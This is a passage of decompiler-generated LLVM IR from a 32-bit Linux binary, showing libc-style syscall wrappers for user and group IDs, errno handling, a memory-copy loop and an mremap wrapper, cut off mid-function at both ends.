  %v6_8053e79 = inttoptr i32 %v5_8053e79 to i32*
  store i32 %stack_var_-36.035, i32* %v6_8053e79, align 4
  %v5_8053e7c = add i32 %v0_8053e7432, -16
  %v6_8053e7c = inttoptr i32 %v5_8053e7c to i32*
  store i32 %arg1, i32* %v6_8053e7c, align 4
  %v1_8053e7f = call i32 @function_8054007(i32 %v2_8053e6a)
  store i32 %v1_8053e7f, i32* %eax.global-to-local, align 4
  %v0_8053e87 = load i32, i32* @esi, align 4
  %v15_8053e87 = icmp eq i32 %v0_8053e87, %tmp14
  %v1_8053e8a = icmp eq i1 %v15_8053e87, false
  br i1 %v1_8053e8a, label %dec_label_pc_8053ef8, label %dec_label_pc_8053e8c

dec_label_pc_8053e8c:                             ; preds = %dec_label_pc_8053e74
  %v1_8053e8c = call i32 @function_8051fb9(i32 %v2_8053e6a)
  store i32 %v1_8053e8c, i32* %eax.global-to-local, align 4
  %v1_8053e91 = inttoptr i32 %v1_8053e8c to i32*
  store i32 22, i32* %v1_8053e91, align 4
  br label %dec_label_pc_8053efd

dec_label_pc_8053e9c:                             ; preds = %dec_label_pc_8053e5a
  %v1_8053e9c = add i32 %v0_8053ea834, 8
  %v2_8053e9c = inttoptr i32 %v1_8053e9c to i32*
  %v3_8053e9c = load i32, i32* %v2_8053e9c, align 4
  store i32 %v3_8053e9c, i32* %eax.global-to-local, align 4
  %v1_8053e9f = add i32 %v0_8053ea834, 12
  %v2_8053e9f = inttoptr i32 %v1_8053e9f to i32*
  %v3_8053e9f = load i32, i32* %v2_8053e9f, align 4
  %v1_8053ea8 = inttoptr i32 %v0_8053ea834 to i32*
  %v2_8053ea8 = load i32, i32* %v1_8053ea8, align 4
  store i32 %v2_8053ea8, i32* %eax.global-to-local, align 4
  %v1_8053eaa = add i32 %v0_8053ea834, 4
  %v2_8053eaa = inttoptr i32 %v1_8053eaa to i32*
  %v3_8053eaa = load i32, i32* %v2_8053eaa, align 4
  %v2_8053ead = add i32 %v1_8053ead33, 4
  %v3_8053ead = inttoptr i32 %v2_8053ead to i32*
  store i32 %v3_8053eaa, i32* %v3_8053ead, align 4
  %v0_8053eb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053eb0 = load i32, i32* @esi, align 4
  %v2_8053eb0 = inttoptr i32 %v1_8053eb0 to i32*
  store i32 %v0_8053eb0, i32* %v2_8053eb0, align 4
  %v0_8053eb2 = load i32, i32* @ebx, align 4
  %v1_8053eb2 = add i32 %v0_8053eb2, 8
  %v2_8053eb2 = inttoptr i32 %v1_8053eb2 to i32*
  %v3_8053eb2 = load i32, i32* %v2_8053eb2, align 4
  store i32 %v3_8053eb2, i32* %eax.global-to-local, align 4
  %v1_8053eb5 = add i32 %v0_8053eb2, 12
  %v2_8053eb5 = inttoptr i32 %v1_8053eb5 to i32*
  %v3_8053eb5 = load i32, i32* %v2_8053eb5, align 4
  store i32 %v3_8053eb5, i32* @edx, align 4
  %v1_8053eb8 = load i32, i32* @esi, align 4
  %v2_8053eb8 = add i32 %v1_8053eb8, 12
  %v3_8053eb8 = inttoptr i32 %v2_8053eb8 to i32*
  store i32 %v3_8053eb5, i32* %v3_8053eb8, align 4
  %v0_8053ebb = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ebb = load i32, i32* @esi, align 4
  %v2_8053ebb = add i32 %v1_8053ebb, 8
  %v3_8053ebb = inttoptr i32 %v2_8053ebb to i32*
  store i32 %v0_8053ebb, i32* %v3_8053ebb, align 4
  %v0_8053ebe = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053ebe = trunc i32 %v0_8053ebe to i16
  %v2_8053ebe = load i32, i32* @esi, align 4
  %v3_8053ebe = add i32 %v2_8053ebe, 16
  %v4_8053ebe = inttoptr i32 %v3_8053ebe to i16*
  store i16 %v1_8053ebe, i16* %v4_8053ebe, align 2
  %v0_8053ec2 = load i32, i32* @ebx, align 4
  %v1_8053ec2 = add i32 %v0_8053ec2, 18
  %v2_8053ec2 = inttoptr i32 %v1_8053ec2 to i8*
  %v3_8053ec2 = load i8, i8* %v2_8053ec2, align 1
  %v4_8053ec2 = zext i8 %v3_8053ec2 to i32
  %v5_8053ec2 = load i32, i32* %eax.global-to-local, align 4
  %v6_8053ec2 = and i32 %v5_8053ec2, -256
  %v7_8053ec2 = or i32 %v6_8053ec2, %v4_8053ec2
  store i32 %v7_8053ec2, i32* %eax.global-to-local, align 4
  %v2_8053ec5 = load i32, i32* @esi, align 4
  %v3_8053ec5 = add i32 %v2_8053ec5, 18
  %v4_8053ec5 = inttoptr i32 %v3_8053ec5 to i8*
  store i8 %v3_8053ec2, i8* %v4_8053ec5, align 1
  %v0_8053ec8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ec8 = load i32, i32* @esp, align 4
  %v2_8053ec8 = add i32 %v1_8053ec8, -4
  %v3_8053ec8 = inttoptr i32 %v2_8053ec8 to i32*
  store i32 %v0_8053ec8, i32* %v3_8053ec8, align 4
  %v0_8053ec9 = load i32, i32* @ebx, align 4
  %v1_8053ec9 = add i32 %v0_8053ec9, 16
  %v2_8053ec9 = inttoptr i32 %v1_8053ec9 to i16*
  %v3_8053ec9 = load i16, i16* %v2_8053ec9, align 2
  %v4_8053ec9 = zext i16 %v3_8053ec9 to i32
  %v1_8053ecd = add nsw i32 %v4_8053ec9, -19
  %v2_8053ed0 = add i32 %v1_8053ec8, -8
  %v3_8053ed0 = inttoptr i32 %v2_8053ed0 to i32*
  store i32 %v1_8053ecd, i32* %v3_8053ed0, align 4
  %v0_8053ed1 = load i32, i32* @ebx, align 4
  %v1_8053ed1 = add i32 %v0_8053ed1, 19
  %v2_8053ed4 = add i32 %v1_8053ec8, -12
  %v3_8053ed4 = inttoptr i32 %v2_8053ed4 to i32*
  store i32 %v1_8053ed1, i32* %v3_8053ed4, align 4
  %v0_8053ed5 = load i32, i32* @esi, align 4
  %v1_8053ed5 = add i32 %v0_8053ed5, 19
  store i32 %v1_8053ed5, i32* %eax.global-to-local, align 4
  %v2_8053ed8 = add i32 %v1_8053ec8, -16
  %v3_8053ed8 = inttoptr i32 %v2_8053ed8 to i32*
  store i32 %v1_8053ed5, i32* %v3_8053ed8, align 4
  %v3_8053ed9 = inttoptr i32 %v2_8053e6a to i16*
  %v4_8053ed9 = call i32 @function_8054202(i16* %v3_8053ed9, i32 %v3_8053e9c, i32 %v3_8053e9f)
  store i32 %v4_8053ed9, i32* %eax.global-to-local, align 4
  %v0_8053ede = load i32, i32* @ebx, align 4
  %v1_8053ede = add i32 %v0_8053ede, 16
  %v2_8053ede = inttoptr i32 %v1_8053ede to i16*
  %v3_8053ede = load i16, i16* %v2_8053ede, align 2
  %v4_8053ede = zext i16 %v3_8053ede to i32
  store i32 %v2_8053e6a, i32* @esi, align 4
  %v2_8053ee5 = add i32 %v4_8053ede, %v0_8053ede
  store i32 %v2_8053ee5, i32* @ebx, align 4
  %v0_8053ee7 = load i32, i32* @esp, align 4
  %v1_8053ee7 = add i32 %v0_8053ee7, 16
  store i32 %v5_8053eed, i32* %eax.global-to-local, align 4
  %v7_8053ef0 = icmp ult i32 %v2_8053ee5, %v5_8053eed
  br i1 %v7_8053ef0, label %dec_label_pc_8053e5a, label %dec_label_pc_8053ef8

dec_label_pc_8053ef8:                             ; preds = %dec_label_pc_8053e3b, %dec_label_pc_8053e9c, %dec_label_pc_8053e74
  %v0_8053ef8 = phi i32 [ %v0_8053e87, %dec_label_pc_8053e74 ], [ %tmp14, %dec_label_pc_8053e3b ], [ %v2_8053e6a, %dec_label_pc_8053e9c ]
  store i32 %v0_8053ef8, i32* %eax.global-to-local, align 4
  %v5_8053efa = sub i32 %v0_8053ef8, %tmp14
  br label %dec_label_pc_8053efd

dec_label_pc_8053efd:                             ; preds = %dec_label_pc_8053e8c, %dec_label_pc_8053e2c, %dec_label_pc_8053ef8
  %storemerge = phi i32 [ %v5_8053efa, %dec_label_pc_8053ef8 ], [ -1, %dec_label_pc_8053e2c ], [ -1, %dec_label_pc_8053e8c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053df6, i32* @ebx, align 4
  store i32 %v0_8053df4, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8053ef8, { 1, 0 }
  uselistorder i32 %v2_8053ee5, { 0, 2, 1 }
  uselistorder i32 %v3_8053e9f, { 1, 0 }
  uselistorder i32 %v3_8053e9c, { 1, 2, 0 }
  uselistorder i32 %v2_8053e6a, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_8053e7432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8053ea834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8053eed, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8053e1f, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_8054202, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 22, { 9, 10, 3, 4, 5, 11, 1, 2, 6, 7, 8, 0 }
  uselistorder i32 -12, { 17, 33, 89, 90, 46, 47, 48, 49, 50, 51, 35, 18, 39, 20, 41, 37, 19, 44, 34, 45, 43, 21, 52, 42, 40, 38, 36, 22, 53, 54, 55, 56, 57, 58, 32, 23, 28, 25, 24, 62, 63, 0, 64, 1, 2, 82, 77, 78, 79, 29, 30, 76, 31, 80, 81, 65, 3, 4, 26, 27, 5, 66, 67, 6, 7, 68, 8, 69, 9, 10, 70, 11, 71, 12, 13, 72, 14, 73, 15, 74, 75, 59, 60, 61, 83, 84, 85, 86, 87, 16, 88 }
  uselistorder i32 -8, { 0, 7, 76, 72, 74, 73, 75, 77, 78, 21, 22, 23, 24, 25, 26, 9, 10, 14, 2, 16, 12, 1, 19, 8, 20, 18, 27, 28, 17, 15, 13, 11, 3, 29, 30, 31, 32, 33, 34, 69, 4, 54, 41, 5, 38, 39, 40, 64, 58, 59, 60, 55, 56, 57, 61, 62, 63, 42, 43, 6, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 35, 36, 37, 65, 66, 67, 68, 70, 71 }
  uselistorder i32* @esp, { 159, 160, 161, 3, 4, 5, 6, 7, 297, 298, 0, 49, 50, 51, 52, 53, 54, 55, 56, 113, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 8, 114, 115, 67, 68, 69, 70, 71, 72, 96, 97, 89, 90, 117, 118, 119, 120, 121, 92, 93, 84, 85, 86, 87, 88, 123, 124, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 122, 74, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 91, 94, 95, 110, 111, 112, 125, 126, 127, 10, 11, 128, 129, 130, 131, 132, 158, 133, 134, 135, 136, 137, 138, 116, 139, 140, 141, 142, 143, 144, 145, 154, 155, 156, 146, 147, 148, 149, 150, 151, 152, 153, 9, 157, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 12, 179, 13, 180, 14, 181, 15, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 16, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 231, 230, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 263, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 1, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 18, 299, 300, 301, 302, 293, 294, 295, 296, 23, 303, 304, 305, 306, 22, 311, 312, 313, 314, 33, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 307, 308, 309, 310, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 24, 340, 341, 342, 34, 343, 344, 345, 346, 347, 348, 349, 351, 350, 2, 352, 353, 354, 355, 356, 357, 358, 359, 21, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 32, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 17, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 26, 25, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 27, 423, 424, 425, 426, 427, 428, 429, 28, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 29, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 30, 450, 451, 31, 452, 453, 454, 455, 456, 457, 458, 459, 460, 20, 35, 461, 462, 463, 464, 465, 466, 467, 36, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 37, 567, 568, 569, 570, 571, 572, 573, 574, 38, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 19, 592, 593, 594 }
  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 42, 130, 131, 61, 62, 63, 64, 65, 66, 67, 43, 68, 69, 46, 15, 49, 18, 51, 52, 47, 17, 57, 58, 44, 45, 59, 60, 55, 56, 19, 70, 71, 53, 54, 50, 48, 16, 20, 72, 21, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 127, 88, 87, 41, 86, 2, 98, 3, 23, 34, 114, 24, 99, 29, 27, 101, 28, 1, 22, 97, 25, 100, 26, 4, 12, 39, 40, 116, 11, 117, 118, 35, 36, 115, 37, 119, 38, 102, 5, 103, 30, 104, 31, 105, 6, 106, 7, 107, 108, 8, 109, 110, 9, 111, 112, 32, 113, 10, 33, 120, 121, 89, 90, 91, 92, 93, 94, 95, 96, 122, 123, 124, 125, 132, 0, 126, 13, 128, 129 }
  uselistorder i32 30, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053efd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053ef8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053e5a, { 1, 0 }
}

define i32 @function_8053f05() local_unnamed_addr {
dec_label_pc_8053f05:
  %stack_var_-8 = alloca i32, align 4
  %v2_8053f08 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8053f0f = call i32 @function_8053faf(i32 7, i32 %v2_8053f08)
  store i32 256, i32* @edx, align 4
  %v2_8053f1c = icmp slt i32 %v2_8053f0f, 0
  br i1 %v2_8053f1c, label %dec_label_pc_8053f24, label %dec_label_pc_8053f20

dec_label_pc_8053f20:                             ; preds = %dec_label_pc_8053f05
  %v3_8053f20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8053f20, i32* @edx, align 4
  br label %dec_label_pc_8053f24

dec_label_pc_8053f24:                             ; preds = %dec_label_pc_8053f05, %dec_label_pc_8053f20
  %v0_8053f24 = phi i32 [ 256, %dec_label_pc_8053f05 ], [ %v3_8053f20, %dec_label_pc_8053f20 ]
  ret i32 %v0_8053f24

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_8053f24, { 1, 0 }
}

define i32 @function_8053f2a() local_unnamed_addr {
dec_label_pc_8053f2a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053f2a = load i32, i32* @ebx, align 4
  store i32 %v0_8053f2a, i32* %stack_var_-4, align 4
  %v1_8053f33 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8053f33, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053f33, -4095
  br i1 %tmp7, label %dec_label_pc_8053f4a, label %dec_label_pc_8053f3e

dec_label_pc_8053f3e:                             ; preds = %dec_label_pc_8053f2a
  %v1_8053f3e = call i32 @function_8051fb9(i32 %v0_8053f2a)
  %v0_8053f43 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f43 = sub i32 0, %v0_8053f43
  %v2_8053f45 = inttoptr i32 %v1_8053f3e to i32*
  store i32 %v1_8053f43, i32* %v2_8053f45, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053f4e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053f4a

dec_label_pc_8053f4a:                             ; preds = %dec_label_pc_8053f2a, %dec_label_pc_8053f3e
  %v2_8053f4e = phi i32 [ %v0_8053f2a, %dec_label_pc_8053f2a ], [ %v2_8053f4e.pre, %dec_label_pc_8053f3e ]
  %v0_8053f4a = phi i32 [ %v1_8053f33, %dec_label_pc_8053f2a ], [ -1, %dec_label_pc_8053f3e ]
  store i32 %v2_8053f4e, i32* @ebx, align 4
  ret i32 %v0_8053f4a

; uselistorder directives
  uselistorder i32 %v1_8053f33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053f4a, { 1, 0 }
}

define i32 @function_8053f50() local_unnamed_addr {
dec_label_pc_8053f50:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053f50 = load i32, i32* @ebx, align 4
  store i32 %v0_8053f50, i32* %stack_var_-4, align 4
  %v1_8053f59 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8053f59, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053f59, -4095
  br i1 %tmp7, label %dec_label_pc_8053f70, label %dec_label_pc_8053f64

dec_label_pc_8053f64:                             ; preds = %dec_label_pc_8053f50
  %v1_8053f64 = call i32 @function_8051fb9(i32 %v0_8053f50)
  %v0_8053f69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f69 = sub i32 0, %v0_8053f69
  %v2_8053f6b = inttoptr i32 %v1_8053f64 to i32*
  store i32 %v1_8053f69, i32* %v2_8053f6b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053f74.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053f70

dec_label_pc_8053f70:                             ; preds = %dec_label_pc_8053f50, %dec_label_pc_8053f64
  %v2_8053f74 = phi i32 [ %v0_8053f50, %dec_label_pc_8053f50 ], [ %v2_8053f74.pre, %dec_label_pc_8053f64 ]
  %v0_8053f70 = phi i32 [ %v1_8053f59, %dec_label_pc_8053f50 ], [ -1, %dec_label_pc_8053f64 ]
  store i32 %v2_8053f74, i32* @ebx, align 4
  ret i32 %v0_8053f70

; uselistorder directives
  uselistorder i32 %v1_8053f59, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053f70, { 1, 0 }
}

define i32 @function_8053f76() local_unnamed_addr {
dec_label_pc_8053f76:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053f76 = load i32, i32* @ebx, align 4
  store i32 %v0_8053f76, i32* %stack_var_-4, align 4
  %v1_8053f7f = call i32 @int80_syscall(i32 200)
  store i32 %v1_8053f7f, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053f7f, -4095
  br i1 %tmp7, label %dec_label_pc_8053f96, label %dec_label_pc_8053f8a

dec_label_pc_8053f8a:                             ; preds = %dec_label_pc_8053f76
  %v1_8053f8a = call i32 @function_8051fb9(i32 %v0_8053f76)
  %v0_8053f8f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f8f = sub i32 0, %v0_8053f8f
  %v2_8053f91 = inttoptr i32 %v1_8053f8a to i32*
  store i32 %v1_8053f8f, i32* %v2_8053f91, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053f9a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053f96

dec_label_pc_8053f96:                             ; preds = %dec_label_pc_8053f76, %dec_label_pc_8053f8a
  %v2_8053f9a = phi i32 [ %v0_8053f76, %dec_label_pc_8053f76 ], [ %v2_8053f9a.pre, %dec_label_pc_8053f8a ]
  %v0_8053f96 = phi i32 [ %v1_8053f7f, %dec_label_pc_8053f76 ], [ -1, %dec_label_pc_8053f8a ]
  store i32 %v2_8053f9a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053f96

; uselistorder directives
  uselistorder i32 %v1_8053f7f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053f96, { 1, 0 }
}

define i32 @function_8053f9c() local_unnamed_addr {
dec_label_pc_8053f9c:
  %v0_8053f9c = load i32, i32* @global_var_80561a4.234, align 4
  %v1_8053fa6 = icmp eq i32 %v0_8053f9c, 0
  br i1 %v1_8053fa6, label %dec_label_pc_8053fac, label %dec_label_pc_8053faa

dec_label_pc_8053faa:                             ; preds = %dec_label_pc_8053f9c
  br label %dec_label_pc_8053fac

dec_label_pc_8053fac:                             ; preds = %dec_label_pc_8053f9c, %dec_label_pc_8053faa
  %storemerge = phi i32 [ %v0_8053f9c, %dec_label_pc_8053faa ], [ 4096, %dec_label_pc_8053f9c ]
  %v0_8053fac = phi i32 [ %v0_8053f9c, %dec_label_pc_8053faa ], [ 4096, %dec_label_pc_8053f9c ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8053fac

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_8053fac, { 1, 0 }
}

define i32 @function_8053faf(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053faf:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053faf = load i32, i32* @ebx, align 4
  store i32 %v0_8053faf, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8053fc2 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8053fc2, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8053fc2, -4095
  br i1 %tmp9, label %dec_label_pc_8053fdb, label %dec_label_pc_8053fcf

dec_label_pc_8053fcf:                             ; preds = %dec_label_pc_8053faf
  %v1_8053fcf = call i32 @function_8051fb9(i32 %v0_8053faf)
  %v0_8053fd4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fd4 = sub i32 0, %v0_8053fd4
  %v2_8053fd6 = inttoptr i32 %v1_8053fcf to i32*
  store i32 %v1_8053fd4, i32* %v2_8053fd6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053fdf.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053fdb

dec_label_pc_8053fdb:                             ; preds = %dec_label_pc_8053faf, %dec_label_pc_8053fcf
  %v2_8053fdf = phi i32 [ %v0_8053faf, %dec_label_pc_8053faf ], [ %v2_8053fdf.pre, %dec_label_pc_8053fcf ]
  %v0_8053fdb = phi i32 [ %v1_8053fc2, %dec_label_pc_8053faf ], [ -1, %dec_label_pc_8053fcf ]
  store i32 %v2_8053fdf, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053fdb

; uselistorder directives
  uselistorder i32 %v1_8053fc2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053fdb, { 1, 0 }
}

define i32 @function_8053fe1() local_unnamed_addr {
dec_label_pc_8053fe1:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053fe1 = load i32, i32* @ebx, align 4
  store i32 %v0_8053fe1, i32* %stack_var_-4, align 4
  %v1_8053fea = call i32 @int80_syscall(i32 199)
  store i32 %v1_8053fea, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053fea, -4095
  br i1 %tmp7, label %dec_label_pc_8054001, label %dec_label_pc_8053ff5

dec_label_pc_8053ff5:                             ; preds = %dec_label_pc_8053fe1
  %v1_8053ff5 = call i32 @function_8051fb9(i32 %v0_8053fe1)
  %v0_8053ffa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ffa = sub i32 0, %v0_8053ffa
  %v2_8053ffc = inttoptr i32 %v1_8053ff5 to i32*
  store i32 %v1_8053ffa, i32* %v2_8053ffc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054005.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054001

dec_label_pc_8054001:                             ; preds = %dec_label_pc_8053fe1, %dec_label_pc_8053ff5
  %v2_8054005 = phi i32 [ %v0_8053fe1, %dec_label_pc_8053fe1 ], [ %v2_8054005.pre, %dec_label_pc_8053ff5 ]
  %v0_8054001 = phi i32 [ %v1_8053fea, %dec_label_pc_8053fe1 ], [ -1, %dec_label_pc_8053ff5 ]
  store i32 %v2_8054005, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054001

; uselistorder directives
  uselistorder i32 %v1_8053fea, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054001, { 1, 0 }
}

define i32 @function_8054007(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054007:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_805401d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805401d, i32* %esi.global-to-local, align 4
  %v1_8054034 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054034, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8054034, -4095
  br i1 %tmp18, label %dec_label_pc_805404e, label %dec_label_pc_8054040

dec_label_pc_8054040:                             ; preds = %dec_label_pc_8054007
  %v2_8054021 = ashr i32 %tmp8, 31
  %v1_8054040 = call i32 @function_8051fb9(i32 %v2_8054021)
  %v0_8054045 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054045 = sub i32 0, %v0_8054045
  %v2_8054047 = inttoptr i32 %v1_8054040 to i32*
  store i32 %v1_8054045, i32* %v2_8054047, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054052

dec_label_pc_805404e:                             ; preds = %dec_label_pc_8054007
  %v1_805404e = icmp eq i32 %v1_8054034, 0
  br i1 %v1_805404e, label %dec_label_pc_8054057, label %dec_label_pc_8054052

dec_label_pc_8054052:                             ; preds = %dec_label_pc_805404e, %dec_label_pc_8054040
  %v0_8054052 = phi i32 [ %v1_8054034, %dec_label_pc_805404e ], [ -1, %dec_label_pc_8054040 ]
  %v1_8054054 = ashr i32 %v0_8054052, 31
  br label %dec_label_pc_805405f

dec_label_pc_8054057:                             ; preds = %dec_label_pc_805404e
  %v3_8054057 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805405f

dec_label_pc_805405f:                             ; preds = %dec_label_pc_8054052, %dec_label_pc_8054057
  %v0_8054065 = phi i32 [ %v0_8054052, %dec_label_pc_8054052 ], [ %v3_8054057, %dec_label_pc_8054057 ]
  %storemerge = phi i32 [ %v1_8054054, %dec_label_pc_8054052 ], [ %tmp, %dec_label_pc_8054057 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8054065

; uselistorder directives
  uselistorder i32 %v1_8054034, { 1, 2, 0, 3 }
  uselistorder i32 31, { 8, 9, 6, 1, 2, 3, 4, 7, 5, 0, 10 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805405f, { 1, 0 }
}

define i32 @function_8054066(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8054066:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054067 = load i32, i32* @esi, align 4
  store i32 %v0_8054067, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805407f = load i32, i32* @ebx, align 4
  %v5_8054087 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8054087 = ptrtoint i32* %v5_8054087 to i32
  store i32 %v0_805407f, i32* @ebx, align 4
  store i32 %v6_8054087, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8054087, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8054093, label %dec_label_pc_805409f

dec_label_pc_8054093:                             ; preds = %dec_label_pc_8054066
  %v1_8054093 = call i32 @function_8051fb9(i32 %v0_805407f)
  %v0_8054098 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054098 = sub i32 0, %v0_8054098
